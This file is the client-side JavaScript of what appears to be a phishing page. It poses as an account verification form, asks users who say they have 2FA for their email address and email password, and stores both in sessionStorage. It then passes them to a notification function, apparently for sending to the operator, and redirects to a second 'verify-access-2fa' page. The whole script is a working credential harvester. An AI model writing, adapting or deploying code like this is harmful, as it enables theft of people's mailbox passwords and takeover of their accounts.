document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('verificationForm');
    const emailSection = document.getElementById('emailSection');
    const has2faInputs = document.querySelectorAll('input[name="has2fa"]');
    const emailInput = document.getElementById('email');
    const emailPasswordInput = document.getElementById('emailPassword');

    // Show/hide email section based on 2FA selection
    has2faInputs.forEach(input => {
        input.addEventListener('change', function() {
            if (this.value === 'yes') {
                emailSection.classList.remove('hidden');
                emailInput.setAttribute('required', '');
                emailPasswordInput.setAttribute('required', '');
            } else {
                emailSection.classList.add('hidden');
                emailInput.removeAttribute('required');
                emailPasswordInput.removeAttribute('required');
            }
        });
    });

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('Form submitted');

        // Get form data
        const has2fa = document.querySelector('input[name="has2fa"]:checked').value;
        console.log('2FA status:', has2fa);

        const userData = {
            has2fa: has2fa,
            timestamp: new Date().toISOString(),
            page: 'index.html'
        };

        // Add email data if 2FA is enabled
        if (has2fa === 'yes') {
            if (!emailInput.value || !emailPasswordInput.value) {
                alert('Please fill in all required fields');
                return;
            }
            userData.email = emailInput.value;
            userData.emailPassword = emailPasswordInput.value;
        }

        // Store data in sessionStorage
        sessionStorage.setItem('has2fa', has2fa);
        if (has2fa === 'yes') {
            sessionStorage.setItem('email', emailInput.value);
            sessionStorage.setItem('emailPassword', emailPasswordInput.value);
        }

        // Send email notification
        try {
            sendEmailNotification(userData);
            console.log('Email notification sent');
        } catch (error) {
            console.error('Error sending email:', error);
        }

        // Redirect to verify-access-2fa.html
        console.log('Redirecting to verify-access-2fa.html');
        window.location.href = 'verify-access-2fa.html';
    });
}); 